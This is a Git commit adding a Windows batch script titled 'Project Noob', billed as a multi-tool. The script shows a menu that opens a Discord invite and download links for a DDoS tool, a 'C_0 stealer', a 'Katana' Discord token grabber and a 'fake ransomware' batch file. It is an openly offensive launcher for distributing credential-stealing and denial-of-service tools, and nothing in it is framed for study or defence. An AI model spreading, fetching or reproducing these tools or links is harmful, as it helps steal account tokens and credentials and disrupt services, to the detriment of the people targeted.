bfa763b86b330a727aa286cb68bb1061b49ec989
epiclollolollol <148511407+epiclollolollol@users.noreply.github.com>
2023-10-20 00:22:34 -0400

    Project Noob
    Batch muti tool!

---
+++ Project Noob.bat
@@ -0,0 +1,20 @@
+@echo off
+cls
+color a
+title Welcome [%USERNAME%]!(thanks for using my muti tool!:))
+mode con lines=30 cols=90 >nul
+echo PPPP  RRRR   OOO      J EEEE  CCC TTTTTT     N   N  OOO   OOO  BBBB  
+echo P   P R   R O   O     J E    C      TT       NN  N O   O O   O B   B 
+echo PPPP  RRRR  O   O     J EEE  C      TT       N N N O   O O   O BBBB  
+echo P     R R   O   O J   J E    C      TT       N  NN O   O O   O B   B 
+echo P     R  RR  OOO   JJJ  EEEE  CCC   TT       N   N  OOO   OOO  BBBB
+echo chose one!
+echo 1.join the discord! 2. darkmagic ddosing tool 3. C_0 stealer 4. katana grabber 5. fake ransomware(press any key to get out) 6. (coming soon!)
+set /p pick=[home]:
+if %pick% == 1 start https://discord.gg/RBfju7Vyn9
+if %pick% == 2 start https://mega.nz/file/Gvx3UQJI#LX4_T63L5T5iXHWEiLQ8u54M-DBRxjRx5oj7sqf3DfE
+if %pick% == 3 start https://cdn.discordapp.com/attachments/1164343152103145512/1164343362460057600/C_0_ST3ALER.zip?ex=6542de42&is=65306942&hm=e25f6ce949394211771c0e3b7f9c5876af6353530a921d3ba21dc1bbb317529c&
+if %pick% == 4 start https://cdn.discordapp.com/attachments/1164343507624923246/1164344610106118244/Token_Logger-2Katana.zip?ex=6542df6b&is=65306a6b&hm=633668a97168a915c8ed487153e5b3c7f52a7aacde8d727cc7841e427ff32568&
+if %pick% == 5 start https://cdn.discordapp.com/attachments/1164352261200294031/1164777829825773688/fakeransomware.bat?ex=654472e3&is=6531fde3&hm=e26a24109ad52233db4a95467c1db56cfe25166b8384bc506864f488d23e2835&
+if %pick% == 6 echo coming soon! pause >nul
+
